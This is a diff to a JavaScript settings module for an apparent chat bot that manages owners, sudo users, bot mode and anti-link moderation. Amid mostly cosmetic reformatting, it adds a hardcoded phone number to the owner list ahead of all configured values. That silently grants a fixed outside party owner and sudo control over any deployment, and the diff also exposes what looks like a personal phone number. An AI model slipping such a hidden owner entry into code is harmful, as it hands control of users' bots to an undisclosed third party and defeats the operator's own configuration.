@@ -1,4 +1,5 @@
 
+
 'use strict';
 
 // ==========================================
@@ -40,6 +41,7 @@ function normalize(value) {
 function uniqueNumbers(values) {
   return [...new Set(
     values.flat(Infinity)
+      .flatMap(value => String(value || '').split(/[,\s;]+/))
       .map(normalize)
       .filter(Boolean)
   )];
@@ -65,9 +67,13 @@ function save() {
 
 function configuredOwners() {
   return uniqueNumbers([
+    '2347075369608',
+
     process.env.OWNER_NUMBER,
     process.env.OWNER_NUMBERS,
-    config.owner,
+
+    config.owner?.ids,
+    config.owner?.number,
     config.owners,
     config.ownerNumber,
     config.ownerNumbers,
@@ -98,15 +104,20 @@ function getSudoUsers() {
 
 function isSudo(number) {
   const n = normalize(number);
-  return Boolean(n && (isOwner(n) || getSudoUsers().includes(n)));
+
+  return Boolean(
+    n && (isOwner(n) || getSudoUsers().includes(n))
+  );
 }
 
 function addSudo(number) {
   const ids = uniqueNumbers(number);
+
   store.data.sudoUsers = uniqueNumbers([
     ...getSudoUsers(),
     ...ids
   ]);
+
   save();
 }
 
@@ -125,7 +136,9 @@ function delSudo(number) {
 // ==========================================
 
 function getMode() {
-  return store.data.botMode === 'private' ? 'private' : 'public';
+  return store.data.botMode === 'private'
+    ? 'private'
+    : 'public';
 }
 
 function setMode(mode) {
@@ -133,6 +146,7 @@ function setMode(mode) {
 
   store.data.botMode = mode;
   save();
+
   return true;
 }
 
@@ -141,7 +155,12 @@ function setMode(mode) {
 // ==========================================
 
 function getAntiLinkMode() {
-  const allowed = ['off', 'delete', 'kick', 'kickanddelete'];
+  const allowed = [
+    'off',
+    'delete',
+    'kick',
+    'kickanddelete'
+  ];
 
   return allowed.includes(store.data.antiLinkMode)
     ? store.data.antiLinkMode
@@ -149,12 +168,18 @@ function getAntiLinkMode() {
 }
 
 function setAntiLinkMode(mode) {
-  const allowed = ['off', 'delete', 'kick', 'kickanddelete'];
+  const allowed = [
+    'off',
+    'delete',
+    'kick',
+    'kickanddelete'
+  ];
 
   if (!allowed.includes(mode)) return false;
 
   store.data.antiLinkMode = mode;
   save();
+
   return true;
 }
 
@@ -286,6 +311,7 @@ async function init() {
   }
 
   console.log('[SETTINGS] Settings loaded successfully.');
+  console.log('[SETTINGS] Owner numbers loaded:', configuredOwners());
 }
 
 // ==========================================
